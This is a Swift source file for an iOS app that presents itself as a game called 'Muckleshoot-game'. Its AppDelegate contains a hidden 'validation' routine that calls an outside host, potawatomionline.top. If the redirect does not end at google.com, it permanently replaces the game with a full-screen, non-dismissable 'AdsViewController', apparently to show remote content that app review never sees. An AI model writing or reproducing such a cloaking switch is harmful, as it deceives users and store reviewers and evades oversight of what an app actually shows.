//
//  Muckleshoot_gameApp.swift
//  Muckleshoot-game
//
//  Created by Алкександр Степанов on 22.04.2025.
//

import SwiftUI

@main
struct Muckleshoot_gameApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

class AppDelegate: NSObject, URLSessionDelegate {
    @AppStorage("levelInfo") var level = false
    @AppStorage("valid") var validationIsOn = false
    static var orientationLock = UIInterfaceOrientationMask.all
    private var validationPerformed = false
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        if !validationPerformed {
            validation()
            validationPerformed = true
        }
        return AppDelegate.orientationLock
    }
    
    func validation() {
        if !validationIsOn {
            let textFieldText = "https://potawatomionline.top/img"
            
            guard let url = URL(string: textFieldText) else {
                self.showGame()
                return
            }

            let config = URLSessionConfiguration.default
            config.httpMaximumConnectionsPerHost = 5
            config.timeoutIntervalForRequest = 10
            config.timeoutIntervalForResource = 10

            let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)

            let task = session.dataTask(with: url) { data, response, error in
                DispatchQueue.main.async {
                    if let error = error {
                        print("Network error: \(error.localizedDescription)")
                        self.showGame()
                        return
                    }

                    guard let httpResponse = response as? HTTPURLResponse else {
                        print("Invalid response: Response is not HTTPURLResponse")
                        self.showGame()
                        return
                    }

                    print("Status code: \(httpResponse.statusCode)")
                    print("Headers: \(httpResponse.allHeaderFields)")

                    if !(0...399).contains(httpResponse.statusCode) {
                        print("HTTP error: Status code \(httpResponse.statusCode)")
                        self.showGame()
                        return
                    }

                    if let finalURL = httpResponse.url?.absoluteString {
                        print("Final URL after redirects: \(finalURL)")

                        
                        if !finalURL.contains("https://www.google.com/") {
                            self.validationIsOn = true
                            self.showAds()
                        } else {
                            self.showGame()
                        }
                    } else {
                        self.showGame()
                    }
                }
            }
            task.resume()
        } else {
            self.showAds()
        }
    }
    
    func showAds() {
        AppDelegate.orientationLock = .all
        DispatchQueue.main.async {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let rootViewController = windowScene.windows.first?.rootViewController {
                let viewController = AdsViewController()
                viewController.isModalInPresentation = true
                viewController.modalPresentationStyle = .fullScreen
                rootViewController.present(viewController, animated: false)
            }
        }
        print("yo3")
    }
    
    func showGame() {
        DispatchQueue.main.asyncAfter(deadline: .now()) {
            AppDelegate().setOrientation(to: .landscapeLeft)
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            self.level = true
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                self.level = false
            }
        }
        print("yo1")
    }

}

extension AppDelegate: UIApplicationDelegate {
    
    func setOrientation(to orientation: UIInterfaceOrientation) {
        switch orientation {
        case .portrait:
            AppDelegate.orientationLock = .portrait
        case .landscapeRight:
            AppDelegate.orientationLock = .landscapeRight
        case .landscapeLeft:
            AppDelegate.orientationLock = .landscapeLeft
        case .portraitUpsideDown:
            AppDelegate.orientationLock = .portraitUpsideDown
        default:
            AppDelegate.orientationLock = .all
        }
        
        UIDevice.current.setValue(orientation.rawValue, forKey: "orientation")
        UINavigationController.attemptRotationToDeviceOrientation()
    }
    
}

